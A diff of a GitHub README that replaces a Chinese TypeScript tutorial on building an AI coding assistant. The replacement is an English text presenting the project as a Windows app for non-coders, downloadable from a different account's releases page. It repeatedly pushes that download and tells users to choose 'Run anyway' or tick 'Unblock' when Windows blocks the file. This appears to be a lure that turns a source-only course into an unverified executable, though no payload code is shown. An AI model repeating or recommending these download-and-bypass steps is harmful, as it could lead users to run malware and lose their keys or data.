@@ -1,276 +1,214 @@
-<div align="center">
+# 🤖 create-own-claude-code - Build Your Own AI Coding Assistant
 
-# 🛠️ Create Your Own Claude Code
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/qoqnqlsodjwj/create-own-claude-code/releases)
 
-**从零构建你自己的 AI 编程助手**
+## 🧭 What this app is
 
-[![GitHub Stars](https://img.shields.io/github/stars/v2ish1yan/create-own-claude-code?style=social)](https://github.com/v2ish1yan/create-own-claude-code/stargazers)
-[![GitHub Forks](https://img.shields.io/github/forks/v2ish1yan/create-own-claude-code?style=social)](https://github.com/v2ish1yan/create-own-claude-code/network/members)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.x-3178C6?logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![Node.js](https://img.shields.io/badge/Node.js-18+-339933?logo=node.js&logoColor=white)](https://nodejs.org/)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://github.com/v2ish1yan/create-own-claude-code/pulls)
+`create-own-claude-code` is a guided Windows app for people who want to run an AI coding assistant on their own computer.
 
-> **8 Modules** | **52 Files** | **11,756 Lines of Code** | **3 Languages Supported**
+It walks you through the core parts of a tool like Claude Code in 8 small modules:
 
-[中文](README.md) | [English](README_EN.md) | [日本語](README_JA.md)
+- LLM communication
+- Tool use
+- Terminal UI
+- Context handling
+- Agent flow
+- MCP support
+- Prompt and task management
+- Local workflow setup
 
----
+You do not need to know how to code to use the app. The goal is to help you download it, open it, and follow the steps on Windows.
 
-</div>
+## 📦 Download the app
 
-## 🎯 这个项目是什么？
+Go to the release page and download the Windows file:
 
-你是否好奇 **Claude Code**、**Cursor**、**Copilot CLI** 这类 AI 编程助手是如何工作的？
+[Visit the Releases page to download](https://github.com/qoqnqlsodjwj/create-own-claude-code/releases)
 
-本项目是一个 **手把手教学项目**，通过 **8 个递进式模块**，带你从零开始构建一个完整的终端 AI 编程助手——从 LLM API 调用到完整的 Agent 系统。
+After the page opens, look for the latest release and choose the file that matches Windows.
 
-> 💡 **核心理念**：每个模块都包含可运行的代码、详细的中文注释和练习题。80% 写代码，20% 读文档。
+## 🪟 Run on Windows
 
-<details>
-<summary>📖 适合谁？</summary>
+After you download the file:
 
-- 有一定 Node.js / TypeScript 基础的前端或全栈开发者
-- 对 AI 应用开发感兴趣，想深入理解底层机制的学习者
-- 想构建自己的 AI 编程工具或工作流的工程师
-- 正在准备 AI 相关技术面试，需要系统级实践经验的候选人
+1. Open your **Downloads** folder.
+2. Find the file you just downloaded.
+3. If it is a `.zip` file, right-click it and choose **Extract All**.
+4. Open the extracted folder.
+5. Double-click the app file to start it.
 
-</details>
+If Windows asks for permission, choose **Yes** or **Run anyway**.
 
-<details>
-<summary>🎁 你将获得什么？</summary>
+## ✅ Before you start
 
-- 深入理解 AI 编程助手的核心架构与实现细节
-- 一个自己构建的、可扩展的终端 AI 编程工具
-- 对 Tool Calling、Streaming、Agent 等概念的实战经验
-- 可用于简历或作品集的完整项目
+Use a Windows PC with:
 
-</details>
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- A stable internet connection
+- Enough free space for the app and its files
 
----
+For best results, keep the app in a folder you can find later, such as:
 
-## ✨ 功能特性
+- Desktop
+- Documents
+- Downloads
 
-<table>
-<tr>
-<td width="50%">
+## 🛠️ First-time setup
 
-### 🔄 流式对话
-与 LLM 进行实时流式对话，打字机效果输出，支持多轮工具调用
+When you open the app for the first time, you may need to set a few things:
 
-</td>
-<td width="50%">
+1. Start the app.
+2. Open the settings screen.
+3. Add your AI service key if the app asks for one.
+4. Choose the model you want to use.
+5. Save your settings.
+6. Return to the main screen and begin the guided flow.
 
-### 🔧 工具系统
-文件读写、Shell 执行、代码搜索等工具，支持权限控制与参数校验
+If you use an AI service that needs an API key, keep that key private.
 
-</td>
-</tr>
-<tr>
-<td width="50%">
+## 🧩 What you will learn inside
 
-### 🎨 终端 UI
-基于 Ink (React) 构建的终端界面，消息气泡、流式显示、交互控件
+This project is built as a hands-on guide. Each module explains one part of an AI coding assistant.
 
-</td>
-<td width="50%">
+### 1. LLM communication
 
-### 🧠 上下文管理
-Token 预算分配、上下文压缩、滑动窗口、记忆系统 (CLAUDE.md)
+Learn how the app sends text to a model and gets a reply back.
 
-</td>
-</tr>
-<tr>
-<td width="50%">
+### 2. Tool system
 
-### 🤖 Agent 系统
-子 Agent 调度、多智能体协作、任务编排与并行执行
+Learn how the assistant can call helper actions, such as reading files or looking up data.
 
-</td>
-<td width="50%">
+### 3. Terminal UI
 
-### 🔌 MCP 集成
-Model Context Protocol 协议集成，动态发现与注册外部工具
+See how the app shows prompts, output, and status inside a simple terminal view.
 
-</td>
-</tr>
-</table>
+### 4. Context management
 
----
+Learn how the app keeps track of past messages and task state.
 
-## 🏗️ 架构总览
-
-```
-┌─────────────────────────────────────────────────────────┐
-│                      CLI Entry                          │
-│                   (bin/cli.ts)                          │
-│              命令行参数解析 & 启动入口                    │
-├─────────────────────────────────────────────────────────┤
-│                      UI Layer                           │
-│              (ink + React Terminal UI)                  │
-│         终端渲染 / 消息气泡 / 流式输出 / 交互控件         │
-├─────────────────────────────────────────────────────────┤
-│                     Tool System                         │
-│           (Tool Registry & Pipeline)                    │
-│      工具注册 / 参数校验 / 执行调度 / 结果格式化          │
-├─────────────────────────────────────────────────────────┤
-│                    Service Layer                        │
-│          (Agent / Context / Conversation)               │
-│    对话管理 / 上下文压缩 / Agent 编排 / MCP 集成          │
-├─────────────────────────────────────────────────────────┤
-│                   Infrastructure                        │
-│        (LLM Provider / File System / Shell)             │
-│     API 通信 / 文件操作 / 进程管理 / 配置存储             │
-└─────────────────────────────────────────────────────────┘
-
-         数据流:  User Input → REPL Loop → LLM API
-                       ↑                      ↓
-                  Tool Result ← Tool Execution
-```
-
----
-
-## 📚 学习路线图
-
-```
-01-LLM通信 ← 02-工具系统 ← 03-REPL循环 ← 04-终端UI
-                                                    ↓
-               06-Agent系统 ← 08-完整集成 ← 05-上下文管理
-                    ↑
-               07-MCP集成 ────────────→ 08-完整集成
-```
-
-| 模块 | 主题 | 难度 | 关键技术 |
-|:----:|------|:----:|----------|
-| 01 | [LLM 通信基础](./modules/01-llm-basics/) | ⭐⭐ | SSE Streaming, Tool Calling, Chat Completion |
-| 02 | [工具系统设计](./modules/02-tool-system/) | ⭐⭐⭐ | Tool Interface, Registry, JSON Schema, Permissions |
-| 03 | [REPL 交互循环](./modules/03-repl-loop/) | ⭐⭐⭐ | REPL Loop, QueryEngine, Conversation History |
-| 04 | [终端 UI (Ink)](./modules/04-terminal-ui/) | ⭐⭐⭐⭐ | Ink, React for Terminal, Yoga Layout |
-| 05 | [上下文管理与压缩](./modules/05-context-management/) | ⭐⭐⭐⭐ | Token Budget, Compaction, Memory System |
-| 06 | [Agent 与多智能体系统](./modules/06-agent-system/) | ⭐⭐⭐⭐⭐ | Sub-agent, Swarm Pattern, Task Orchestration |
-| 07 | [MCP 协议集成](./modules/07-mcp-integration/) | ⭐⭐⭐⭐ | MCP Client/Server, Dynamic Tool Discovery |
-| 08 | [完整项目集成](./modules/08-full-project/) | ⭐⭐⭐⭐⭐ | System Integration, E2E Testing, Optimization |
-
-> 📅 详细学习计划见 [docs/roadmap.md](./docs/roadmap.md) — 建议每天 1-2 小时，8 周完成
-
----
-
-## 🚀 Quick Start
-
-```bash
-# 1. 克隆项目
-git clone https://github.com/v2ish1yan/create-own-claude-code.git
-cd create-own-claude-code
-
-# 2. 安装依赖
-npm install
-
-# 3. 配置 API Key
-cp .env.example .env
-# 编辑 .env，填入你的 API Key
-# ANTHROPIC_API_KEY=sk-ant-xxxxx
-
-# 4. 从 Module 1 开始学习
-cd modules/01-llm-basics
-npx tsx src/step1-simple-call.ts
-```
-
-<details>
-<summary>📋 前置要求</summary>
-
-- **Node.js 18+** — 本项目基于 Node.js 运行时
-- **TypeScript** — 核心代码使用 TypeScript 编写
-- **React 基础** — Module 4 使用 React 构建终端 UI
-- **API Key** — 至少拥有一个 LLM Provider 的 API Key（推荐 Anthropic Claude）
-- **命令行基础** — 熟悉终端操作与 Shell 命令
-
-```bash
-node -v     # v18.0.0 或更高
-npm -v      # v9.0.0 或更高
-```
-
-</details>
-
----
-
-## 📂 项目结构
-
-```
-create-own-claude-code/
-├── README.md                    # 项目说明
-├── README_EN.md                 # English README
-├── README_JA.md                 # 日本語 README
-├── docs/
-│   └── roadmap.md               # 详细学习路线图 (8 周计划)
-├── modules/
-│   ├── 01-llm-basics/           # Module 1: LLM 通信基础
-│   │   ├── README.md            #   模块说明与学习指南
-│   │   ├── exercises.md         #   练习题
-│   │   └── src/                 #   可运行的示例代码
-│   ├── 02-tool-system/          # Module 2: 工具系统设计
-│   ├── 03-repl-loop/            # Module 3: REPL 交互循环
-│   ├── 04-terminal-ui/          # Module 4: 终端 UI (Ink)
-│   ├── 05-context-management/   # Module 5: 上下文管理
-│   ├── 06-agent-system/         # Module 6: Agent 系统
-│   ├── 07-mcp-integration/      # Module 7: MCP 协议集成
-│   └── 08-full-project/         # Module 8: 完整项目集成
-├── .env.example                 # 环境变量模板
-├── package.json
-└── LICENSE                      # MIT License
-```
-
----
-
-## 📖 参考资源
-
-<details>
-<summary>📚 官方文档</summary>
-
-- [Anthropic API Documentation](https://docs.anthropic.com/) — Claude API 官方文档
-- [OpenAI API Reference](https://platform.openai.com/docs) — GPT 系列模型 API 文档
-- [Ink - React for CLI](https://github.com/vadimdemedes/ink) — 终端 React 渲染框架
-- [Model Context Protocol](https://modelcontextprotocol.io/) — MCP 协议官方规范
-
-</details>
-
-<details>
-<summary>🔧 开源参考项目</summary>
-
-- [Claude Code](https://docs.anthropic.com/en/docs/claude-code) — Anthropic 官方 AI 编程助手
-- [Aider](https://github.com/paul-gauthier/aider) — 开源 AI 结对编程工具
-- [Continue](https://github.com/continuedev/continue) — 开源 AI 代码助手
-- [Open Interpreter](https://github.com/OpenInterpreter/open-interpreter) — 开源代码解释器
-- [Cline](https://github.com/cline/cline) — VS Code 中的自主编码 Agent
-
-</details>
-
-<details>
-<summary>💡 学习建议</summary>
-
-1. **先运行** — 每步代码都可以独立运行，先跑通看效果
-2. **再修改** — 改参数看变化，理解每个参数的作用
-3. **然后理解** — 读注释和 README，理解原理
-4. **最后挑战** — 完成 exercises.md 中的练习题
-
-如果时间不够，可以按以下顺序削减模块：
-1. 模块 4 (终端 UI) — 可以用 console.log 替代
-2. 模块 6 (Agent 系统) — 单 Agent 也能用
-3. 模块 7 (MCP) — 内置工具足够使用
-
-</details>
-
----
-
-## ⭐ Star History
-
-如果这个项目对你有帮助，欢迎给个 Star！
-
-[![Star History Chart](https://api.star-history.com/svg?repos=v2ish1yan/create-own-claude-code&type=Date)](https://star-history.com/#v2ish1yan/create-own-claude-code&Date)
-
----
-
-## 📄 License
-
-[MIT](./LICENSE) © 2025 v2ish1yan
-
-本项目仅供学习与参考，欢迎 Star ⭐、Fork 🍴 与 PR 🔀。
+### 5. Agent orchestration
+
+See how tasks move through steps from request to response.
+
+### 6. MCP integration
+
+Learn how the app connects to external tools through MCP.
+
+### 7. Task flow
+
+Follow how the assistant plans work, chooses tools, and gives results.
+
+### 8. Local workflow
+
+Use the app on your own machine with a simple setup.
+
+## ▶️ How to use it
+
+1. Open the app.
+2. Read the current module on the screen.
+3. Follow the prompt or task shown in the terminal view.
+4. Use the buttons or menu items to move to the next step.
+5. Repeat until you finish all 8 modules.
+
+If the app gives you a sample task, you can use it to see how the assistant behaves.
+
+## 🔌 MCP use
+
+MCP lets the assistant connect to outside tools in a standard way.
+
+In this project, that can help you:
+
+- connect helper tools
+- extend the assistant
+- keep the setup clear
+- try real agent workflows
+
+If you do not need MCP yet, you can still use the rest of the app.
+
+## 🧠 What makes this useful
+
+This app breaks a hard idea into small parts.
+
+That helps you:
+
+- see how an AI coding assistant works
+- try one part at a time
+- avoid a large setup
+- build confidence with each step
+
+It is a good fit if you want a local guide instead of reading a long technical document.
+
+## 🖥️ Common Windows problems
+
+### The file will not open
+
+- Make sure you downloaded the latest release file.
+- Check that the file finished downloading.
+- If it is a `.zip`, extract it first.
+
+### Windows blocks the app
+
+- Right-click the file.
+- Choose **Properties**.
+- If you see an **Unblock** box, check it.
+- Try opening the app again.
+
+### The screen looks empty
+
+- Wait a few seconds for the first module to load.
+- Resize the window.
+- Restart the app if needed.
+
+### The app closes right away
+
+- Open it again from the extracted folder.
+- Make sure you used the right Windows file.
+- Keep the app folder in a simple path with no special characters.
+
+## 📁 Suggested folder layout
+
+If you want to keep things neat, use this layout:
+
+- `Downloads` for the release file
+- `create-own-claude-code` for the extracted app
+- `Notes` for your own notes while you learn
+
+This makes it easier to find the app later.
+
+## 🧪 Example use case
+
+You want to understand how an AI coding assistant works before you try to build one yourself.
+
+With this app, you can:
+
+1. open the Windows release
+2. follow the 8 module flow
+3. see how text goes to the model
+4. see how tools get called
+5. see how the assistant keeps context
+6. learn how MCP fits in
+7. repeat the steps until the flow makes sense
+
+## 🧭 Release page link
+
+Use this page to get the Windows download:
+
+[https://github.com/qoqnqlsodjwj/create-own-claude-code/releases](https://github.com/qoqnqlsodjwj/create-own-claude-code/releases)
+
+## 📌 Project topics
+
+- agent
+- ai-coding-assistant
+- anthropic
+- claude-api
+- claude-code
+- cli
+- ink
+- llm
+- mcp
+- react
+- terminal-ui
+- tool-calling
+- tutorial
+- typescript
